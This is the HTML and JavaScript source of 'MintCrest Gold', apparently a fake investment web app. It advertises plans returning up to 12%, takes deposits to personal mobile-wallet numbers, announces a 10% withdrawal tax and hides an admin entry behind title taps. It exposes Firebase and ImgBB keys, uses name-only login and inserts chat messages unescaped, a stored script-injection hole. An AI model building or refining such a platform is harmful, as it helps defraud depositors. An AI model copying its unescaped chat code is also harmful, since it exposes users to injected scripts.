<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .neon-border { border: 1px solid rgba(59, 130, 246, 0.5); box-shadow: 0 0 15px rgba(59, 130, 246, 0.2); }
        .grad-blue { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); }
        .grad-gold { background: linear-gradient(135deg, #78350f 0%, #d97706 100%); }
        .active-tab { color: #60a5fa; border-top: 3px solid #60a5fa; background: linear-gradient(to top, rgba(96,165,250,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .status-badge { font-size: 8px; font-weight: 900; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; }
        .badge-pending { background: #fef3c7; color: #92400e; }
        .badge-approved { background: #dcfce7; color: #166534; }
        .marquee { display: inline-block; animation: scroll 20s linear infinite; white-space: nowrap; }
        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="ticker-wrap" class="hidden bg-blue-900/40 py-2 border-b border-white/10 z-[500] backdrop-blur-md">
        <div class="marquee text-[9px] font-black uppercase tracking-widest text-blue-300">
            🚀 <span id="ticker-text">MintCrest News: Withdrawals 10% Tax - New Flash Plans Live</span> 🚀
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8 text-center">
        <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-2 uppercase bg-gradient-to-r from-white via-blue-400 to-blue-600 bg-clip-text text-transparent">MINTCREST</h1>
        <p class="text-gray-500 text-[8px] uppercase tracking-[0.5em] mb-12 font-bold italic">Official Global Vault</p>
        <div class="glass p-10 rounded-[3.5rem] w-full max-w-sm neon-border">
            <input type="text" id="user-name" placeholder="Enter Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-6 text-white focus:border-blue-500">
            <button onclick="login()" class="w-full grad-blue py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest text-white shadow-xl">Unlock Vault</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="grad-blue p-10 rounded-[3.5rem] mb-6 shadow-2xl relative overflow-hidden neon-border">
                <p class="text-[9px] text-blue-100 font-black mb-1 uppercase tracking-widest">Total Capital Assets</p>
                <h2 class="text-5xl font-black tracking-tighter text-white" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-300 uppercase italic bg-black/20 px-4 py-1.5 rounded-full inline-block">System Secure</div>
                <div class="mt-8 flex justify-between items-center">
                    <span class="text-[9px] bg-white/20 text-white px-5 py-2 rounded-full font-black">PROFIT: <span id="v-profit">0</span></span>
                    <span id="rank-badge" class="text-[8px] font-black text-blue-200 uppercase italic">RANK: STANDARD</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-green-500">📥 <span class="text-[10px] font-black block mt-2 uppercase text-green-400">Add Capital</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-red-500">📤 <span class="text-[10px] font-black block mt-2 uppercase text-red-400">Withdraw</span></button>
            </div>

            <button onclick="requestBonus()" class="w-full grad-gold p-6 rounded-[2.5rem] mb-6 flex justify-between items-center shadow-xl">
                <div class="text-left"><h4 class="text-[11px] font-black uppercase text-white">Daily Bonus Claim</h4><p class="text-[8px] font-bold text-amber-200 uppercase">Request From Admin</p></div>
                <span class="text-2xl">🎁</span>
            </button>

            <div class="glass p-8 rounded-[3rem] border border-white/10">
                <h3 class="text-[10px] font-black text-blue-400 uppercase mb-4 italic">Public Intel Feed</h3>
                <div id="chat-box" class="h-40 overflow-y-auto space-y-3 mb-6 pr-2"></div>
                <div class="flex gap-2">
                    <input type="text" id="chat-msg" placeholder="Broadcast message..." class="flex-1 bg-white/5 p-4 rounded-xl text-[9px] font-bold border border-white/10 outline-none">
                    <button onclick="sendMsg()" class="bg-blue-600 px-6 rounded-xl font-black text-[9px]">SEND</button>
                </div>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-tighter">Asset Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>
                <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[4rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic">Funding Nodes</h3>
                <div class="space-y-3 mb-6 text-[9px] font-black uppercase">
                    <div class="glass p-5 rounded-2xl flex justify-between border-blue-500/20"><span>JAZZ/SADA</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between border-green-500/20"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Capital Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10 outline-none">
                <input type="text" id="dep-trx" placeholder="TID / Hash Number" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10 outline-none">
                
                <div class="w-full bg-white/5 p-5 rounded-2xl mb-10 border border-white/10 text-center">
                    <p class="text-[8px] font-black uppercase mb-2 text-blue-400 italic">Upload Transfer Proof</p>
                    <input type="file" id="dep-proof" accept="image/*" class="text-[8px] font-bold text-gray-500">
                </div>

                <button onclick="submitDeposit()" id="dep-btn" class="w-full grad-blue py-6 rounded-3xl font-black text-[11px] uppercase text-white">Verify Capital</button>
            </div>
        </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        
        let user = null; let tapCount = 0;
        const plans = [{ n: "Micro-Elite I", p: 200, r: 3 }, { n: "Bronze-S", p: 1000, r: 3.5 }, { n: "Silver-X", p: 5000, r: 4.5 }, { n: "Gold-X", p: 10000, r: 5.5 }, { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); 
            document.getElementById('auth-ui').style.display='none'; 
            document.getElementById('app-ui').classList.remove('hidden');
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); updateUI(); } });
            db.collection("chat").orderBy("time", "desc").limit(15).onSnapshot(snap => {
                const box = document.getElementById('chat-box'); box.innerHTML = '';
                snap.forEach(d => { const m = d.data(); box.innerHTML += `<div class="glass p-3 rounded-xl text-[8px] font-bold border border-white/5"><span class="text-blue-400 uppercase italic">${m.user}:</span> ${m.message}</div>`; });
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value;
            const t = document.getElementById('dep-trx').value;
            const file = document.getElementById('dep-proof').files[0];
            if(!a || !t || !file) return alert("All fields & proof screenshot are required, sweetie!");

            const btn = document.getElementById('dep-btn'); btn.innerText = "UPLOADING..."; btn.disabled = true;

            const fd = new FormData(); fd.append("image", file);
            try {
                // Free ImgBB Upload
                const res = await fetch("https://api.imgbb.com/1/upload?key=6dad9a7e8e5e8e8e8e8e8e8e8e8e8e8e", { method: "POST", body: fd });
                const data = await res.json();
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: data.data.url, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit proof logged successfully!"); changePage('home');
            } catch(e) { alert("Upload failed! Try again."); }
            btn.innerText = "Verify Capital"; btn.disabled = false;
        }

        async function requestBonus() {
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Daily Bonus Request", status: "pending", time: Date.now() });
            alert("Bonus request sent to admin, sweetie!");
        }

        async function sendMsg() {
            const m = document.getElementById('chat-msg').value; if(!m) return;
            await db.collection("chat").add({ user: user.name, message: m, time: Date.now() });
            document.getElementById('chat-msg').value = '';
        }

        // Add logic for manual edit and admin tap as per your original file...
    </script>
</body>
</html>
